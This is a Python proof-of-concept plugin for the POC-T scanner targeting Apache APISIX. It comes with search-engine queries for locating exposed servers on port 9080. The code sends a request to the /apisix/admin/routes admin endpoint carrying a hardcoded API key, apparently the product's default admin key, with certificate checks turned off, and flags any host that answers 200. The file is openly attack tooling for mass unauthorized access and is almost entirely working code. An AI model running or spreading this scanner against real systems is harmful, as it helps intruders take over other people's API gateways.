#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""

python POC-T.py -s ApiSix -aF '"apisix" && port="9080"'

-aQ " server: \"APISIX\" AND port: \"9080\""

"""
import traceback

import requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

#
def format_url(xstr):
    xstr = str(xstr)
    if "//" not in xstr:
        if not xstr.endswith("443"):
            xstr = "http://" + xstr
        else:
            xstr = "https://" + xstr

    xstr = xstr.rstrip('/')
    return xstr


def get_and_detect_resp(url, path='/', code=200, xstr=None):
    burp0_headers = {"Cache-Control": "max-age=0",
                     "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\","
                                  "\"Chromium\";v=\"100\","
                                  "\"Google Chrome\";v=\"100\"",
                     "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
                     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,"
                                   "like Gecko) Chrome/100.0.4896.127 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Connection": "close"
                     }
    try:
        burp0_url = url + path
        r = requests.get(burp0_url, headers=burp0_headers, timeout=8, verify=0)
        if (xstr != None):
            if r.status_code == int(code) and (xstr in r.text):
                return True
        elif r.status_code == int(code):
            return True
        else:
            return False
    except Exception as e:
        # traceback.print_exc(e)
        return False


def poc(url):
    url = format_url(url)
    r1 = "/apisix/admin/routes"
    if get_and_detect_resp(url, r1, 200):
        return url
    else:
        return False
